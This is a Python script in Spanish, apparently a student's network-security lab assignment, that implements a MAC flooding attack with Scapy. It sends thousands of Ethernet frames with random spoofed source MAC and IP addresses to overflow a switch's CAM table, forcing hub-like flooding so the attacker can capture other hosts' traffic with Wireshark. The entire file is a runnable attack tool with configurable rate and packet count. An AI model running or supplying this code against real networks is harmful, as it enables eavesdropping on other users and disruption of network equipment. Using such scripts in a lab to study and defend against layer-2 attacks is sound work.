#!/usr/bin/env python3
# ==============================================================================
# Ataque MAC Flooding - Desbordamiento de Tabla CAM
# Autor     : Emmanuel Orlando Rodriguez
# Matricula : 2025-0798
# Asignatura: Seguridad en Redes
# Fecha     : Junio 2026
# Script    : EmmanuelRodriguez_2025-0798_mac_flooding_P2.py
# ==============================================================================
#
# DESCRIPCION:
#   Este script implementa un ataque MAC Flooding. Envia miles de frames
#   Ethernet con direcciones MAC de origen falsas y aleatorias, llenando
#   la tabla CAM del switch (ESW1). Cuando la tabla CAM se desborda, el
#   switch deja de poder asociar MACs a puertos y comienza a reenviar
#   TODO el trafico a TODOS los puertos (modo hub/flooding), permitiendo
#   al atacante (Kali) capturar el trafico de todos los hosts de la red.
#
# USO:
#   sudo python3 EmmanuelRodriguez_2025-0798_mac_flooding_P2.py
#
# REQUISITOS:
#   - Kali Linux con Python 3.x
#   - Libreria Scapy: sudo apt install python3-scapy
#   - Permisos root (sudo)
#   - Conectividad de capa 2 con el switch (misma subred)
# ==============================================================================

import sys
import time
import signal
import random
from scapy.all import Ether, IP, sendp, conf

# ==============================================================================
# CONFIGURACION
# ==============================================================================
IFACE    = "eth1"   # Interfaz de red del atacante conectada al switch
DELAY    = 0.001    # Segundos entre paquetes (1000 pkt/seg - alta velocidad)
MAX_PKTS = 10000    # Maximo de paquetes (0 = infinito)

# Contadores
sent       = 0
start_time = None

# ==============================================================================
# FUNCIONES
# ==============================================================================

def random_mac():
    """
    Genera una direccion MAC de origen completamente aleatoria.
    Cada frame tiene una MAC distinta para que el switch crea
    una entrada nueva en su tabla CAM por cada frame recibido.
    """
    return "%02x:%02x:%02x:%02x:%02x:%02x" % (
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
    )


def random_ip():
    """Genera una IP de origen aleatoria para variar el contenido del frame."""
    return "%d.%d.%d.%d" % (
        random.randint(1, 254),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(1, 254),
    )


def build_flood_frame(src_mac):
    """
    Construye un frame Ethernet con MAC de origen falsa.
    Se envia a broadcast (ff:ff:ff:ff:ff:ff) para garantizar
    que el switch procese y aprenda la MAC falsa en su tabla CAM.
    """
    frame = (
        Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff") /
        IP(src=random_ip(), dst="255.255.255.255")
    )
    return frame


def signal_handler(sig, frame):
    elapsed = time.time() - start_time if start_time else 0
    rate    = sent / elapsed if elapsed > 0 else 0
    print(f"\n\n[*] Ataque detenido por el usuario.")
    print(f"[*] Frames enviados      : {sent}")
    print(f"[*] Tiempo transcurrido  : {elapsed:.1f} segundos")
    print(f"[*] Tasa promedio        : {rate:.0f} frames/seg")
    print("[*] Para verificar el efecto usar Wireshark en Kali.")
    print("[*] La tabla CAM del switch se recupera sola al expirar las entradas.")
    sys.exit(0)

# ==============================================================================
# MAIN
# ==============================================================================

def main():
    global sent, start_time

    signal.signal(signal.SIGINT, signal_handler)
    conf.verb = 0  # Silenciar Scapy

    print("=" * 62)
    print("  Ataque MAC Flooding - Desbordamiento de Tabla CAM")
    print("  Autor     : Emmanuel Orlando Rodriguez")
    print("  Matricula : 2025-0798")
    print("=" * 62)
    print(f"[+] Interfaz  : {IFACE}")
    print(f"[+] Velocidad : {int(1/DELAY)} frames/seg")
    print(f"[+] Limite    : {'Infinito' if MAX_PKTS == 0 else MAX_PKTS} frames")
    print("-" * 62)
    print("[*] Inundando tabla CAM del switch... (Ctrl+C para detener)")
    print("[!] Abrir Wireshark en Kali para capturar trafico ajeno.\n")

    start_time = time.time()

    while True:
        if MAX_PKTS > 0 and sent >= MAX_PKTS:
            print(f"\n[+] Limite de {MAX_PKTS} frames alcanzado.")
            break

        src_mac = random_mac()
        frame   = build_flood_frame(src_mac)

        sendp(frame, iface=IFACE, verbose=False)
        sent += 1

        # Mostrar progreso cada 100 frames
        if sent % 100 == 0:
            elapsed = time.time() - start_time
            rate    = sent / elapsed if elapsed > 0 else 0
            print(f"[+] Frames: {sent:>6} | MAC: {src_mac} | {rate:.0f} frames/seg")

        time.sleep(DELAY)

    elapsed = time.time() - start_time
    print(f"\n[*] Ataque completado.")
    print(f"[*] Total frames enviados : {sent}")
    print(f"[*] Tiempo total          : {elapsed:.1f} segundos")
    print("[!] Verificar con Wireshark si el switch esta en modo flooding.")


if __name__ == "__main__":
    main()
